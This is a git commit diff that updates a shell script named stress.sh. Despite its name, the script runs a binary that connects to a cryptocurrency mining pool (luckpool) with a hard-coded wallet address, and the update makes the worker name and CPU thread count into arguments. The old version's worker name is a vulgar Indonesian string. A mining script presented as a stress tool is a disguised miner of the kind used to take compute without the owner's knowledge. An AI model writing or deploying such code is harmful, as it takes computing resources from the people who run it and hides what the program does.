b283800bb2155e70e57d4e8014cff1d16f448913
Diaz Nuraji <84665900+Diaz1401@users.noreply.github.com>
2021-06-23 12:21:23 +0700

    Update stress.sh

--- stress.sh
+++ stress.sh
@@ -1,5 +1,6 @@
 #!/bin/sh
 
-CONNECT="na.luckpool.net:3957"
-FUCK="$(echo NGENTOD-$(shuf -i 1000-9999 -n 1)-GAYA)"
-./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t 4 -p x
+FUCK="$1"
+CPU="$2"
+CONNECT="na.luckpool.net:3956"
+./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t $CPU -p x
